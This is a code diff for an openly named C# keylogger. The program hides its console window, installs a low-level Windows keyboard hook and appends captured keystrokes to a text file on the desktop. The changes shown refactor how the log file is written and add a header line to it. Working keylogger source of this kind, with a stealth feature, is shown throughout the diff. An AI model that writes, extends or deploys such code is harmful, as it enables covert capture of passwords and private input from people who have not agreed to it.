@@ -1,4 +1,5 @@
-﻿using Windows.Win32;
+﻿using System.Reflection;
+using Windows.Win32;
 using Windows.Win32.Foundation;
 using Windows.Win32.UI.WindowsAndMessaging;
 
@@ -8,30 +9,34 @@ namespace klog;
 public static class Program
 {
     private const uint BufferSize = 256;
+    // ReSharper disable InconsistentNaming
     private const int KEYDOWN = 0x0100;
     private const int KEYUP = 0x0101;
     private const int SYSKEYDOWN = 0x0104;
+    // ReSharper restore InconsistentNaming
 
     private static readonly string PathToFile =
         Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "klog.txt");
 
     private static readonly List<string> Buffer = new();
+    private static readonly StreamWriter Writer = new(PathToFile, true);
     private static UnhookWindowsHookExSafeHandle? _kbHook;
-    private static StreamWriter _writer = new(PathToFile, true);
     private static bool _capsLockActive;
     private static bool _shiftActive;
 
     public static unsafe void Main()
     {
         HideWindow();
+        WriteInfoToLogFile();
         
         // get caps lock state when program opens
         _capsLockActive = GetCapsLockState();
 
         // install a keyboard hook
         _kbHook = PInvoke.SetWindowsHookEx(
-            WINDOWS_HOOK_ID.WH_KEYBOARD_LL, KeyboardCallback, null, 0);
+            WINDOWS_HOOK_ID.WH_KEYBOARD_LL, KeyboardProcedure, null, 0);
 
+        
         // set up message queue
         MSG msg = new();
         while (PInvoke.GetMessage(&msg, new HWND(), 0, 0))
@@ -39,14 +44,17 @@ public static class Program
             PInvoke.TranslateMessage(msg);
             PInvoke.DispatchMessage(msg);
         }
-
+        
         // clean disposable things up
         _kbHook.Close();
-        _writer.Flush();
-        _writer.Dispose();
+        WriteBuffer();
+        Writer.Dispose();
     }
-
-    private static unsafe LRESULT KeyboardCallback(int code, WPARAM wParam, LPARAM lParam)
+    
+    /// <summary>
+    /// Logs key presses to a file. Meant to be used with SetWindowsHookEx.
+    /// </summary>
+    private static unsafe LRESULT KeyboardProcedure(int code, WPARAM wParam, LPARAM lParam)
     {
         var kbStruct = (KBDLLHOOKSTRUCT*)lParam.Value.ToPointer();
 
@@ -336,14 +344,7 @@ public static class Program
         if (Buffer.Count >= BufferSize)
             try
             {
-                await WriteBuffer();
-            }
-            catch (ObjectDisposedException e)
-            {
-                // if the StreamWriter was somehow disposed, create a new one
-                _writer = new StreamWriter(PathToFile, true);
-                await WriteBuffer();
-                Console.WriteLine(e.Message);
+                await WriteBufferAsync();
             }
             catch (InvalidOperationException e)
             {
@@ -351,7 +352,7 @@ public static class Program
                 // the code waits for 1 second before writing the buffer and copies the buffer before that so there's
                 // no new buffer that would be written twice to the file while the old one would be lost
                 var tempBuffer = Buffer;
-                await Task.Delay(1000).ContinueWith(_ => WriteBuffer(tempBuffer));
+                await Task.Delay(1000).ContinueWith(_ => WriteBufferAsync(tempBuffer));
                 Console.WriteLine(e.Message);
             }
 
@@ -359,23 +360,32 @@ public static class Program
     }
 
     /// <summary>
-    ///     Writes buffer to <see cref="PathToFile"/> using the <see cref="_writer"/>
+    ///     Writes <see cref="Buffer"/> to <see cref="PathToFile">the log file</see> using the <see cref="Writer"/>
     /// </summary>
-    private static async Task WriteBuffer()
+    private static void WriteBuffer()
     {
-        foreach (var str in Buffer) await _writer.WriteAsync(str);
-        await _writer.FlushAsync();
+        foreach (var str in Buffer) Writer.Write(str);
+        Writer.Flush();
+    }
+    
+    /// <summary>
+    ///     Asynchronously writes <see cref="Buffer"/> to <see cref="PathToFile">the log file</see> using the <see cref="Writer"/>
+    /// </summary>
+    private static async Task WriteBufferAsync()
+    {
+        foreach (var str in Buffer) await Writer.WriteAsync(str);
+        await Writer.FlushAsync();
         Buffer.Clear();
     }
 
     /// <summary>
-    ///     Writes passed buffer to <see cref="PathToFile"/> using the <see cref="_writer"/>
+    ///     Asynchronously writes passed buffer to <see cref="PathToFile">the log file</see> using the <see cref="Writer"/>
     /// </summary>
     /// <param name="buffer">Buffer to be written</param>
-    private static async Task WriteBuffer(ICollection<string> buffer)
+    private static async Task WriteBufferAsync(ICollection<string> buffer)
     {
-        foreach (var str in Buffer) await _writer.WriteAsync(str);
-        await _writer.FlushAsync();
+        foreach (var str in Buffer) await Writer.WriteAsync(str);
+        await Writer.FlushAsync();
 
         buffer.Clear();
     }
@@ -396,5 +406,16 @@ public static class Program
     {
         var hWnd = PInvoke.GetConsoleWindow();
         PInvoke.ShowWindow(hWnd, SHOW_WINDOW_CMD.SW_HIDE);
+    }
+
+    private static void WriteInfoToLogFile()
+    {
+        if (new FileInfo(PathToFile).Length != 0) return;
+
+        // TODO add kb layout info
+        Writer.Write($"https://github.com/schmaldeo/keylogger v{Assembly.GetEntryAssembly()!.GetName().Version} {DateTime.Now}\n\n" +
+                          $"If you see something like: [CODE: xxxx], you can check what key the code represents on " +
+                          $"https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes\n\n");
+        Writer.Flush();
     }
 }
